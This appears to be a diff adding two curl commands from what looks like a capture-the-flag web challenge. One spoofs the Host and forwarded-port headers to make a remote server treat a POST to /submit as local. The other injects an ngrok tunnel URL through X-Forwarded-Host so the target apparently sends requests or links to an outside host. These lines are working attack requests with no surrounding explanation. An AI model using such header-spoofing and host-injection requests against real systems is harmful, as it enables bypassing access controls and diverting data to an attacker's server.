@@ -1,0 +1,2 @@
+curl -d '{'id':3,'message':'thing','hidden':0}' -i -H x-forwarded-port:1337 -H HOST:127.0.0.1 -X POST -x http://127.0.0.1:1337 http://188.166.172.138:31023/submit/ -k 
+curl -H X-Forwarded-Host:https://e7dd-2601-1c0-cf00-52b0-8cca-abea-ac99-f66c.ngrok.io/ -i -x http://127.0.0.1:1337 http://188.166.172.138:31131/letters
